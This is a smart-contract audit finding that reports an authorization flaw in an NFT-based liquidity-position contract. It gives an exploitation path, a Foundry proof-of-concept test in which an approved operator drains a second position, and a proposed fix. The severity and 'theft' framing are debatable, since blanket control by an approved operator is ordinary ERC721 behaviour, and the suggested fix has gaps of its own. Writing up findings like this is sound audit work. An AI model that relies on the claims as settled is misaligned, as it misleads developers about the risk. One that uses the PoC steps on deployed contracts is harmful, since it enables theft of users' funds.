## Title
Approved NFT Operators Can Maliciously Access All Positions Associated With An NFT Across Different Pools and Tick Ranges

## Summary
The `authorizedForNft` modifier in `BaseNonfungibleToken.sol` only verifies NFT ownership/approval without checking which specific position (pool and tick range) is being accessed. Since the same NFT ID can be used to create multiple distinct positions by varying the tick ranges and pools, an approved operator gains unrestricted access to withdraw liquidity and collect fees from ALL positions associated with that NFT ID, not just a single intended position. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/BasePositions.sol` (functions: `deposit` line 79, `withdraw` line 128, `collectFees` lines 103 and 113)

**Intended Logic:** Based on documentation stating "Each NFT represents ownership of a liquidity position in a specific pool and tick range" (singular), users expect that approving an operator for their position NFT grants access to one specific position.

**Actual Logic:** Positions are uniquely identified by combining the NFT ID (as a 24-byte salt) with tick ranges to create a `PositionId`. The authorization check only validates NFT ownership, allowing approved operators to specify ANY pool and tick range parameters to access different positions sharing the same NFT ID salt. [2](#0-1) [3](#0-2) 

**Exploitation Path:**
1. Alice mints NFT #123 and deposits liquidity to create Position A: `deposit(123, poolKeyX, 0, 100, amounts)` → creates PositionId from `bytes24(uint192(123)) | tickLower=0 | tickUpper=100`
2. Alice later deposits to Position B using same NFT: `deposit(123, poolKeyY, 200, 300, amounts)` → creates different PositionId from `bytes24(uint192(123)) | tickLower=200 | tickUpper=300`
3. Alice approves Bob for NFT #123 via standard ERC721 `approve()`, intending to grant access to only Position A
4. Bob exploits by calling `withdraw(123, poolKeyY, 200, 300, liquidity)` to drain Position B, which Alice did not intend to authorize [4](#0-3) [5](#0-4) 

**Security Property Broken:** Violates the "Withdrawal Availability" invariant - positions should only be withdrawable by the owner or explicitly authorized parties for that specific position, not by operators authorized for a related but distinct position.

## Impact Explanation
- **Affected Assets**: All liquidity positions and accumulated fees associated with any NFT ID where the owner has granted approval
- **Damage Severity**: Complete loss of liquidity and fees from unintended positions. If Alice has 10 ETH in Position A and 100 ETH in Position B (both using NFT #123), approving an operator for what she believes is only Position A exposes all 110 ETH to theft
- **User Impact**: Any LP who uses the same NFT ID for multiple positions (across different pools or tick ranges) and grants approval will have ALL positions exposed, not just the intended one

## Likelihood Explanation
- **Attacker Profile**: Any address that receives NFT approval from a position owner (could be a malicious smart contract, compromised hot wallet, or malicious UI frontend)
- **Preconditions**: 
  1. User creates multiple positions using the same NFT ID with different tick ranges or pools
  2. User grants approval via `approve()` or `setApprovalForAll()` to an operator
  3. Positions contain withdrawable liquidity or collectible fees
- **Execution Complexity**: Single transaction calling `withdraw()` or `collectFees()` with the target position's parameters
- **Frequency**: Exploitable immediately upon receiving approval, can drain all positions in one transaction

## Recommendation

Add position-specific authorization by storing and verifying authorized position parameters: [4](#0-3) 

**FIXED:**
```solidity
// Add mapping to track approved positions
mapping(uint256 => mapping(bytes32 => bool)) public approvedPositions;

// New function to approve specific positions
function approvePosition(
    uint256 id, 
    PoolKey memory poolKey, 
    int32 tickLower, 
    int32 tickUpper
) external {
    require(_isApprovedOrOwner(msg.sender, id), "Not authorized");
    bytes32 positionHash = keccak256(abi.encode(poolKey, tickLower, tickUpper));
    approvedPositions[id][positionHash] = true;
}

// Modified authorization check
modifier authorizedForPosition(
    uint256 id,
    PoolKey memory poolKey,
    int32 tickLower,
    int32 tickUpper
) {
    if (_ownerOf(id) != msg.sender) {
        bytes32 positionHash = keccak256(abi.encode(poolKey, tickLower, tickUpper));
        require(approvedPositions[id][positionHash], "Not authorized for this position");
    }
    _;
}

// Update all functions to use the new modifier
function deposit(...) public payable authorizedForPosition(id, poolKey, tickLower, tickUpper) { ... }
function withdraw(...) public payable authorizedForPosition(id, poolKey, tickLower, tickUpper) { ... }
function collectFees(...) public payable authorizedForPosition(id, poolKey, tickLower, tickUpper) { ... }
```

**Alternative Mitigation:** Enforce one-to-one mapping between NFT IDs and positions by storing the position parameters (pool and ticks) when first created and rejecting subsequent `deposit()` calls with different parameters.

## Proof of Concept
```solidity
// File: test/Exploit_NFTPositionAuthBypass.t.sol
// Run with: forge test --match-test test_NFTPositionAuthBypass -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";

contract Exploit_NFTPositionAuthBypass is FullTest {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    
    function setUp() public override {
        super.setUp();
        
        // Give Alice tokens
        token0.mint(alice, 1000e18);
        token1.mint(alice, 1000e18);
    }
    
    function test_NFTPositionAuthBypass() public {
        // SETUP: Alice creates a pool
        PoolKey memory poolKey = createPool(0, 1 << 63, 100);
        
        vm.startPrank(alice);
        
        // Alice mints NFT #1 and creates Position A (ticks -100 to 100)
        token0.approve(address(positions), 200e18);
        token1.approve(address(positions), 200e18);
        
        uint256 nftId = positions.mint();
        positions.deposit(nftId, poolKey, -100, 100, 100e18, 100e18, 0);
        
        // Alice creates Position B using SAME NFT (ticks 200 to 300) 
        positions.deposit(nftId, poolKey, 200, 300, 100e18, 100e18, 0);
        
        // Verify Alice has liquidity in both positions
        (uint128 liquidityA,,,,) = positions.getPositionFeesAndLiquidity(nftId, poolKey, -100, 100);
        (uint128 liquidityB,,,,) = positions.getPositionFeesAndLiquidity(nftId, poolKey, 200, 300);
        assertGt(liquidityA, 0, "Position A should have liquidity");
        assertGt(liquidityB, 0, "Position B should have liquidity");
        
        // Alice approves Bob for the NFT (thinking it's only for Position A)
        positions.approve(bob, nftId);
        vm.stopPrank();
        
        // EXPLOIT: Bob withdraws from Position B (which Alice didn't intend to authorize)
        vm.startPrank(bob);
        uint256 bobBalanceBefore = token0.balanceOf(bob);
        
        (uint128 amount0, uint128 amount1) = positions.withdraw(
            nftId, 
            poolKey, 
            200,  // Position B tick range
            300, 
            liquidityB
        );
        
        // VERIFY: Bob successfully stole Position B funds
        assertGt(amount0, 0, "Bob withdrew token0 from unauthorized position");
        assertGt(amount1, 0, "Bob withdrew token1 from unauthorized position");
        assertEq(token0.balanceOf(bob), bobBalanceBefore + amount0, "Bob received stolen funds");
        
        vm.stopPrank();
    }
}
```

**Notes:**
- The vulnerability stems from the architectural decision to allow the same NFT ID as a salt for multiple PositionIds rather than enforcing a one-to-one NFT-to-position mapping
- The standard ERC721 approval mechanism grants blanket access to all positions sharing an NFT ID, creating an unintended privilege escalation
- This affects both `BasePositions` and `Orders` contracts which share the same authorization pattern [6](#0-5)

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/types/positionId.sol (L31-36)
```text
function createPositionId(bytes24 _salt, int32 _tickLower, int32 _tickUpper) pure returns (PositionId v) {
    assembly ("memory-safe") {
        // v = salt | (tickLower << 32) | tickUpper
        v := or(shl(64, shr(64, _salt)), or(shl(32, and(_tickLower, 0xFFFFFFFF)), and(_tickUpper, 0xFFFFFFFF)))
    }
}
```

**File:** src/base/BasePositions.sol (L79-97)
```text
    ) public payable authorizedForNft(id) returns (uint128 liquidity, uint128 amount0, uint128 amount1) {
        SqrtRatio sqrtRatio = CORE.poolState(poolKey.toPoolId()).sqrtRatio();

        liquidity =
            maxLiquidity(sqrtRatio, tickToSqrtRatio(tickLower), tickToSqrtRatio(tickUpper), maxAmount0, maxAmount1);

        if (liquidity < minLiquidity) {
            revert DepositFailedDueToSlippage(liquidity, minLiquidity);
        }

        if (liquidity > uint128(type(int128).max)) {
            revert DepositOverflow();
        }

        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_DEPOSIT, msg.sender, id, poolKey, tickLower, tickUpper, liquidity)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L128-133)
```text
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L244-246)
```text
                poolKey,
                createPositionId({_salt: bytes24(uint192(id)), _tickLower: tickLower, _tickUpper: tickUpper}),
                int128(liquidity)
```

**File:** src/Orders.sol (L56-74)
```text
        authorizedForNft(id)
        returns (uint112 saleRate)
    {
        uint256 realStart = FixedPointMathLib.max(block.timestamp, orderKey.config.startTime());

        unchecked {
            if (orderKey.config.endTime() <= realStart) {
                revert OrderAlreadyEnded();
            }

            saleRate = uint112(computeSaleRate(amount, uint32(orderKey.config.endTime() - realStart)));

            if (saleRate > maxSaleRate) {
                revert MaxSaleRateExceeded();
            }
        }

        lock(abi.encode(CALL_TYPE_CHANGE_SALE_RATE, msg.sender, id, orderKey, saleRate));
    }
```
